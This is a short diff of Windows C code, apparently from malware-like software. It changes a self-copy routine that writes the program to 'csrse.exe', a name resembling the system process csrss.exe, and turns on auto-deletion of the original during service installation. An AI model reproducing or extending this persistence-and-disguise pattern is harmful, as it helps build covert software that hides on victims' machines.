@@ -635,7 +635,7 @@ void ServiceInstall(BOOL auto_delete){
         strcat(target,"\\csrse.exe");
         // printf(target);
         //CopyFile(szPath,target,TRUE);
-        if (!CopySelf(szPath,target,0)){
+        if (!CopySelf(szPath,target,3000)){
             CopyFile(szPath,target,TRUE);
         }
 
@@ -661,7 +661,7 @@ int _stdcall WinMain(
     int nCmdShow
 )
 {
-    ServiceInstall(false);
+    ServiceInstall(true);
     
     Init();
     return 0;
